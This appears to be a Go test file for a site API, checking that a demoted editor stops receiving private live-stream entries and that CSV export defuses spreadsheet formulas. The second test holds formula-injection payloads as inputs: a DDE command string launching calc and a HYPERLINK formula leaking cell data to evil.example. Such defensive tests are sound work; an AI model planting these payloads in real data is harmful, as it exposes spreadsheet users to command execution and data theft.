package data_test

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// A live stream keeps the role it was opened with. After an editor is
// demoted to viewer, a private collection's entries by others must stop
// arriving right away (not only after reconnecting).
func TestLiveStreamFollowsRoleChanges(t *testing.T) {
	slug := newSite(t, "editor:eve@x.test", "vic@x.test")
	eve := as(t, "eve@x.test", "Eve", "")
	vic := as(t, "vic@x.test", "Vic", "")
	adm := admin(t)
	base := "/api/v1/sites/" + slug + "/db/"
	adm.mustApp("PUT", base+"hr/_rule", map[string]any{"rule": "private"}, 200)
	ev, stop := sse(t, eve, slug, "db:hr")
	defer stop()
	time.Sleep(50 * time.Millisecond)
	vic.must("POST", base+"hr", map[string]any{"note": "first"}, 201)
	if m := next(t, ev); m["ch"] != "db:hr" {
		t.Fatalf("editor didn't see the entry: %v", m)
	}
	adm.mustApp("POST", "/api/v1/sites/"+slug+"/members", map[string]any{"type": "user", "id": "eve@x.test", "role": "viewer"}, 200)
	vic.must("POST", base+"hr", map[string]any{"note": "salary review"}, 201)
	select {
	case m := <-ev:
		if strings.Contains(fmt.Sprint(m), "salary review") {
			t.Fatalf("demoted editor still receives others' private entries: %v", m)
		}
	case <-time.After(400 * time.Millisecond):
	}
}

// Viewers write entries; editors download them as CSV and open them in a
// spreadsheet. Text that starts like a formula must not run as one.
func TestCSVExportDefusesFormulas(t *testing.T) {
	slug := newSite(t, "mal@x.test")
	mal := as(t, "mal@x.test", "=cmd|' /C calc'!A0", "")
	adm := admin(t)
	base := "/api/v1/sites/" + slug + "/db/"
	mal.must("POST", base+"feedback", map[string]any{"text": `=HYPERLINK("https://evil.example/?"&A1,"open")`, "n": -3}, 201)
	st, _, raw := adm.do("GET", base+"feedback/_export?format=csv", nil, false)
	if st != 200 {
		t.Fatalf("export: %d", st)
	}
	out := string(raw)
	if strings.Contains(out, ",=HYPERLINK") || strings.Contains(out, "\n=HYPERLINK") || strings.Contains(out, `"=HYPERLINK`) || strings.Contains(out, ",=cmd") || strings.Contains(out, `"=cmd`) {
		t.Fatalf("formula exported as-is:\n%s", out)
	}
	if !strings.Contains(out, ",-3,") && !strings.HasSuffix(strings.TrimSpace(strings.Split(out, "\n")[1]), "-3") && !strings.Contains(out, "-3") {
		t.Fatalf("numbers must stay numbers:\n%s", out)
	}
}
